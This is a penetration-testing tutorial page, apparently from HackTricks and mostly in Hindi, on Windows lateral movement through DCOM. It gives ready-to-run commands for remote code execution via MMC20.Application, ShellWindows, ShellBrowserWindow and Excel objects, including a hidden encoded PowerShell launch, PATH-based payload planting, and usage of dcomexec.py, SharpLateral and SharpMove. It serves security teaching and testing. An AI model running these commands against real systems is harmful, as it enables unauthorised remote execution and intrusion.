# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement आकर्षक है क्योंकि यह service या scheduled task बनाने के बजाय RPC/DCOM पर exposed मौजूदा COM servers का पुनः उपयोग करता है। व्यवहार में इसका अर्थ है कि initial connection आमतौर पर TCP/135 पर शुरू होता है और फिर dynamically assigned high RPC ports पर चला जाता है।

## Prerequisites & Gotchas

- आमतौर पर target पर local administrator context आवश्यक होता है और remote COM server को remote launch/activation की अनुमति देनी होती है।
- **14 मार्च, 2023** से Microsoft supported systems के लिए DCOM hardening लागू करता है। पुराने clients, जो low activation authentication level का अनुरोध करते हैं, विफल हो सकते हैं जब तक वे कम-से-कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` पर negotiate न करें। Modern Windows clients आमतौर पर स्वतः ऊपर के स्तर पर सेट हो जाते हैं, इसलिए current tooling सामान्यतः काम करती रहती है।<sup>[[3]](#references)</sup>
- Manual या scripted DCOM execution के लिए सामान्यतः TCP/135 और target की dynamic RPC port range आवश्यक होती है। यदि आप Impacket की `dcomexec.py` का उपयोग कर रहे हैं और command output वापस चाहते हैं, तो आमतौर पर `ADMIN$` (या किसी अन्य writable/readable share) तक SMB access भी आवश्यक होता है।
- यदि RPC/DCOM काम करता है लेकिन SMB blocked है, तो `dcomexec.py -nooutput` blind execution के लिए फिर भी उपयोगी हो सकता है।

त्वरित जाँचें:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

इस technique के बारे में अधिक जानकारी के लिए [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) देखें।<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects, objects के साथ network-based interactions के लिए एक उपयोगी capability प्रदान करते हैं। Microsoft, DCOM और Component Object Model (COM) दोनों के लिए व्यापक documentation उपलब्ध कराता है, जिसे [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) access किया जा सकता है। DCOM applications की list निम्नलिखित PowerShell command का उपयोग करके प्राप्त की जा सकती है:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting सक्षम करता है। विशेष रूप से, इस object में `Document.ActiveView` के अंतर्गत एक `ExecuteShellCommand` method मौजूद है। इस method के बारे में अधिक जानकारी [यहाँ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाकर जांचें:<sup>[[6]](#references)</sup>

यह feature DCOM application के माध्यम से network पर commands execute करने की सुविधा प्रदान करता है। DCOM के साथ remotely admin के रूप में interact करने के लिए PowerShell का उपयोग इस प्रकार किया जा सकता है:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
यह command DCOM application से connect करता है और COM object का एक instance लौटाता है। इसके बाद remote host पर process execute करने के लिए ExecuteShellCommand method को invoke किया जा सकता है। इस process में निम्नलिखित steps शामिल हैं:

Methods जाँचें:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE प्राप्त करें:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
अंतिम argument window style है। `7` window को minimized रखता है। Operationally, MMC-based execution में आमतौर पर remote `mmc.exe` process आपके payload को spawn करता है, जो नीचे दिए गए Explorer-backed objects से अलग है।

## ShellWindows & ShellBrowserWindow

**इस technique के बारे में अधिक जानकारी के लिए original post देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object में explicit "LaunchPermissions" नहीं पाए गए। यह default रूप से ऐसी permissions पर निर्भर करता है जो Administrators को access की अनुमति देती हैं। अधिक जानकारी के लिए [यह thread](https://twitter.com/tiraniddo/status/817532039771525120) देखा जा सकता है। Explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET का उपयोग recommended है।

दो specific objects, `ShellBrowserWindow` और `ShellWindows`, को उनकी explicit Launch Permissions की कमी के कारण highlight किया गया। `HKCR:\AppID\{guid}` के अंतर्गत `LaunchPermission` registry entry का न होना explicit permissions के न होने का संकेत है।

`MMC20.Application` की तुलना में, ये objects OPSEC के दृष्टिकोण से अक्सर अधिक शांत रहते हैं, क्योंकि remote host पर command आमतौर पर `mmc.exe` के बजाय `explorer.exe` की child process बन जाती है।

### ShellWindows

`ShellWindows` में ProgID नहीं है। इसके लिए .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके AppID का उपयोग करके object instantiation को संभव बनाते हैं। यह process `ShellWindows` के लिए CLSID प्राप्त करने हेतु OleView .NET का उपयोग करता है। Instantiation के बाद, `WindowsShell.Item` method के माध्यम से interaction संभव है, जिससे `Document.Application.ShellExecute` जैसे method invocation किए जा सकते हैं।

Object को instantiate करने और remotely commands execute करने के लिए Example PowerShell commands दिए गए थे:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` समान है, लेकिन आप इसे सीधे इसके CLSID के माध्यम से instantiate कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects के साथ Lateral Movement

DCOM Excel objects का exploitation करके Lateral Movement किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के माध्यम से Lateral Movement के लिए Excel DDE का लाभ उठाने पर [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) में दी गई चर्चा पढ़ने की सलाह दी जाती है।<sup>[[5]](#references)</sup>

Empire project एक PowerShell script प्रदान करता है, जो DCOM objects में हेरफेर करके remote code execution (RCE) के लिए Excel के उपयोग को प्रदर्शित करती है। नीचे [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) पर उपलब्ध script के snippets दिए गए हैं, जो RCE के लिए Excel का abuse करने के विभिन्न methods दिखाते हैं:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
हाल के research ने इस क्षेत्र का विस्तार `Excel.Application` के `ActivateMicrosoftApp()` method के साथ किया है। मुख्य विचार यह है कि Excel, system `PATH` में खोज करके FoxPro, Schedule Plus या Project जैसे legacy Microsoft applications को launch करने का प्रयास कर सकता है। यदि कोई operator target के `PATH` में शामिल किसी writable location में उन expected names में से किसी एक नाम वाला payload रख सकता है, तो Excel उसे execute कर देगा।<sup>[[4]](#references)</sup>

इस variation के लिए requirements:

- target पर Local admin
- target पर Excel installed होना
- target के `PATH` में किसी writable directory में payload लिखने की ability

FoxPro lookup (`FOXPROW.exe`) का abuse करने वाला practical example:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो इसके बजाय CLSID द्वारा remote object को instantiate करें:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
व्यवहार में दुरुपयोग किए गए मान:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement के लिए Automation Tools

इन techniques को automate करने के लिए दो tools को highlight किया गया है:

- **Invoke-DCOM.ps1**: Empire project द्वारा प्रदान की गई PowerShell script, जो remote machines पर code execute करने के लिए विभिन्न methods के invocation को सरल बनाती है। यह script Empire GitHub repository में उपलब्ध है।

- **SharpLateral**: remote रूप से code execute करने के लिए design किया गया tool, जिसका उपयोग इस command के साथ किया जा सकता है:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) अन्य machines में code execute करने के लिए comments में दिए गए सभी तरीकों को आसानी से invoke करने की अनुमति देता है।
- आप DCOM का उपयोग करके remote systems पर commands execute करने के लिए Impacket के `dcomexec.py` का उपयोग कर सकते हैं। वर्तमान builds `ShellWindows`, `ShellBrowserWindow` और `MMC20` को support करते हैं, और default रूप से `ShellWindows` का उपयोग करते हैं।
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- आप [**SharpMove**](https://github.com/0xthirteen/SharpMove) का भी उपयोग कर सकते हैं
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Object का उपयोग करके Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM के माध्यम से Lateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass में बदलाव प्रबंधित करना (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application की शक्ति का दुरुपयोग](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM के माध्यम से Lateral Movement के लिए Excel DDE का उपयोग](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
